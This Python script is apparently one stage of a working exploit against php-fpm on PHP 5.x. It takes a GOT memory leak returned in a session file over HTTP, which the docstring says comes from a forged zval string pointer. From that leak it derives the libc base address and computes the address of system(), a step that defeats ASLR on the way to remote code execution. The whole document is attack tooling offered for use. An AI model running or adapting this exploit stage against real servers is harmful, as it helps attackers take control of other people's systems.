#!/usr/bin/env python3
"""Derive the libc base from a fetched 5.x session-file GOT leak.

Input: the session file as served over HTTP, the fixed non-PIE address the
fake zval's string pointer was set to, and the php-fpm binary (for the
relocation table).  The leaked bytes are the binary's memory starting at
that address; every 8-byte slot that has a dynamic relocation is matched
against its libc dynamic-symbol offset.  The libc base is the value that
the largest number of independent GOT entries agree on.
"""
import argparse, collections, re, struct, subprocess


def relocations(binary):
    out = subprocess.run(["readelf", "-rW", binary], capture_output=True,
                         text=True).stdout
    rel = {}
    for line in out.splitlines():
        m = re.match(r"^([0-9a-f]{16})\s+[0-9a-f]+\s+(\S+)\s+([0-9a-f]+)\s+(\S+)", line)
        if m:
            rel[int(m.group(1), 16)] = m.group(4).split("@")[0]
    return rel


def libc_symbols(path):
    dyn = {}
    out = subprocess.run(["nm", "-D", path], capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and re.match(r"^[0-9a-f]+$", parts[0]):
            dyn.setdefault(parts[2].split("@")[0], int(parts[0], 16))
    return dyn


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--blob", required=True)
    ap.add_argument("--got", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--slen", type=int, required=True)
    ap.add_argument("--binary", required=True)
    ap.add_argument("--libc", default="/usr/lib/x86_64-linux-gnu/libc.so.6")
    ap.add_argument("--label", default="leak")
    a = ap.parse_args()

    data = open(a.blob, "rb").read()
    hdr = ("s:%d:\"" % a.slen).encode()
    i = data.find(hdr)
    if i < 0:
        raise SystemExit("serialized string header not found")
    mem = data[i + len(hdr):i + len(hdr) + a.slen]
    if len(mem) != a.slen:
        raise SystemExit("short blob: %d" % len(mem))

    rel = relocations(a.binary)
    dyn = libc_symbols(a.libc)
    cands = collections.Counter()
    detail = []
    for off, sym in sorted(rel.items()):
        if not (a.got <= off < a.got + a.slen):
            continue
        if sym not in dyn:
            continue
        v = struct.unpack("<Q", mem[off - a.got:off - a.got + 8])[0]
        if v < 0x400000:
            continue
        base = v - dyn[sym]
        if 0x7f0000000000 <= base < 0x800000000000:
            cands[base] += 1
            detail.append((off, sym, v, base))

    print("== %s ==" % a.label)
    print("file %s (%d bytes), GOT base %#x, length %d" % (a.blob, len(data), a.got, a.slen))
    print("candidates: %s" % ", ".join("%#x:%d" % (b, c) for b, c in cands.most_common(4)))
    if not cands:
        print("NO libc candidate")
        return
    base, count = cands.most_common(1)[0]
    print("LIBC BASE (leak-derived) = %#x from %d independent GOT entries" % (base, count))
    for off, sym, v, b in detail:
        if b == base:
            print("  %#010x %-24s %#018x = base+%#x" % (off, sym, v, dyn[sym]))
    print("system offset in %s = %#x" % (a.libc, dyn["system"]))
    print("system = %#x" % (base + dyn["system"]))


if __name__ == "__main__":
    main()
